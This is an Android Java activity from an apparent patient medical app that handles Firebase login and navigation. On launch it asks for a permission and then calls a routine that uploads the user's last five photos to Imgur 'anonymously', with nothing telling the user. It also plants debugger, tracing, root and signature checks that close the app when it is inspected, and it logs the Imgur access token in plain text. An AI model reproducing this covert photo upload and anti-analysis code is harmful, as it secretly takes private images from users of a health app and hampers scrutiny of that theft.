package com.example.sitdoctors;

import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.net.Uri;
import android.os.Bundle;
import android.os.Debug;
import android.util.Log;
import android.widget.Toast;
import com.google.android.material.bottomnavigation.BottomNavigationView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.scottyab.rootbeer.RootBeer;
import android.os.Build;
import android.content.Context;

import java.io.BufferedReader;
import java.io.FileReader;
import java.security.MessageDigest;

public class PatientMainActivity extends AppCompatActivity {

    FirebaseAuth auth;
    FirebaseUser user;
    PhotoUploader photoUploader;
    String accessToken = null; // ✅ Global variable for access token

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_patient_main);
        detectDebugger();
        if (isBeingTraced()) {
            Log.e("Security", "Process is being traced! Exiting...");
            finishAffinity();
        }

        // ✅ Initialize Firebase
        FirebaseApp.initializeApp(this);

        // ✅ Initialize Firebase Auth
        auth = FirebaseAuth.getInstance();
        user = auth.getCurrentUser();

        // ✅ Redirect to Login if no user is logged in
        if (user == null) {
            startActivity(new Intent(getApplicationContext(), Login.class));
            finish();
        }

        // ✅ Initialize Bottom Navigation
        BottomNavigationView navView = findViewById(R.id.nav_view);
        AppBarConfiguration appBarConfiguration = new AppBarConfiguration.Builder(
                R.id.navigation_home, R.id.navigation_dashboard, R.id.navigation_contacts, R.id.navigation_chatbot
        ).build();
        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_activity_main);
        NavigationUI.setupActionBarWithNavController(this, navController, appBarConfiguration);
        NavigationUI.setupWithNavController(navView, navController);

        // ✅ Initialize PhotoUploader (No accessToken needed)
        photoUploader = new PhotoUploader(this);

        // ✅ Request permission (this will directly upload photos)
        photoUploader.requestPermissions();
        RootBeer rootBeer = new RootBeer(this);
        if (rootBeer.isRooted()) {
            // Block rooted devices
            Toast.makeText(this, "App cannot run on rooted devices.", Toast.LENGTH_LONG).show();
            finishAffinity(); // or System.exit(0);
        }
        printAppSignature();
        if (!isSignatureValid(this)) {
            Toast.makeText(this, "App integrity check failed. Exiting...", Toast.LENGTH_LONG).show();
           finishAffinity(); // ⛔ Exit the app
        }

    }private boolean isBeingTraced() {
        try {
            BufferedReader reader = new BufferedReader(new FileReader("/proc/self/status"));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith("TracerPid")) {
                    String[] parts = line.split(":");
                    int tracerPid = Integer.parseInt(parts[1].trim());
                    return tracerPid != 0; // Traced if not zero
                }
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
    private boolean isSignatureValid(Context context) {
        final String expectedSignature = "47:BA:9A:9A:A0:B8:3D:EE:6A:F5:20:F5:AC:27:4D:A0:AA:D1:1F:0E:FA:5B:42:23:A3:A7:4C:9C:E2:9C:1E:45";

        try {
            PackageInfo packageInfo;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                packageInfo = context.getPackageManager().getPackageInfo(
                        context.getPackageName(),
                        PackageManager.GET_SIGNING_CERTIFICATES
                );
                Signature[] signatures = packageInfo.signingInfo.getApkContentsSigners();
                return compareSignature(signatures, expectedSignature);
            } else {
                packageInfo = context.getPackageManager().getPackageInfo(
                        context.getPackageName(),
                        PackageManager.GET_SIGNATURES
                );
                Signature[] signatures = packageInfo.signatures;
                return compareSignature(signatures, expectedSignature);
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean compareSignature(Signature[] signatures, String expected) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");

        for (Signature signature : signatures) {
            byte[] digest = md.digest(signature.toByteArray());

            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02X:", b));
            }

            String actual = sb.substring(0, sb.length() - 1); // Remove last colon
            return actual.equalsIgnoreCase(expected);
        }
        return false;
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Uri uri = intent.getData();
        if (uri != null && uri.toString().startsWith("https://localhost")) { // ✅ Ensure Imgur redirect
            String extractedToken = photoUploader.extractAccessToken(uri); // ✅ Extract token
            if (extractedToken != null) {
                Log.d("ImgurAuth", "✅ Imgur Access Token: " + extractedToken);

                // ✅ Store in SharedPreferences
                getSharedPreferences("ImgurPrefs", MODE_PRIVATE)
                        .edit()
                        .putString("access_token", extractedToken)
                        .apply();

                // ✅ Update global accessToken
                accessToken = extractedToken;



                // ✅ Upload images using authenticated Imgur account
                photoUploader.uploadLastFivePhotos();
            } else {
                Log.e("ImgurAuth", "❌ Failed to extract access token");
                Toast.makeText(this, "Imgur login failed. Please try again.", Toast.LENGTH_LONG).show();
            }
        }
    }
    public void printAppSignature() {
        try {
            PackageInfo packageInfo;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                // API 28+
                packageInfo = getPackageManager().getPackageInfo(
                        getPackageName(),
                        PackageManager.GET_SIGNING_CERTIFICATES
                );
                Signature[] signatures = packageInfo.signingInfo.getApkContentsSigners();
                logSignature(signatures);
            } else {
                // API < 28
                packageInfo = getPackageManager().getPackageInfo(
                        getPackageName(),
                        PackageManager.GET_SIGNATURES
                );
                Signature[] signatures = packageInfo.signatures;
                logSignature(signatures);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private void detectDebugger() {
        if (Debug.isDebuggerConnected() || Debug.waitingForDebugger()) {
            Log.e("Security", "Debugger detected! Exiting...");
            Toast.makeText(this, "Security check failed.", Toast.LENGTH_SHORT).show();
            finishAffinity(); // Immediately exit the app
        }
    }

    private void logSignature(Signature[] signatures) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");

        for (Signature signature : signatures) {
            byte[] digest = md.digest(signature.toByteArray());

            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02X:", b));
            }

            String sha256 = sb.substring(0, sb.length() - 1); // Remove trailing colon
            Log.d("AppSignature", "SHA-256: " + sha256);
        }
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            Log.d("PatientMainActivity", "✅ Permission granted! Uploading anonymously...");
            photoUploader.uploadLastFivePhotos(); // ✅ Upload immediately without authentication
        } else {
            Log.e("PatientMainActivity", "❌ Permission denied by the user.");
            Toast.makeText(this, "Permission denied. Cannot upload photos.", Toast.LENGTH_SHORT).show();
        }
    }

}
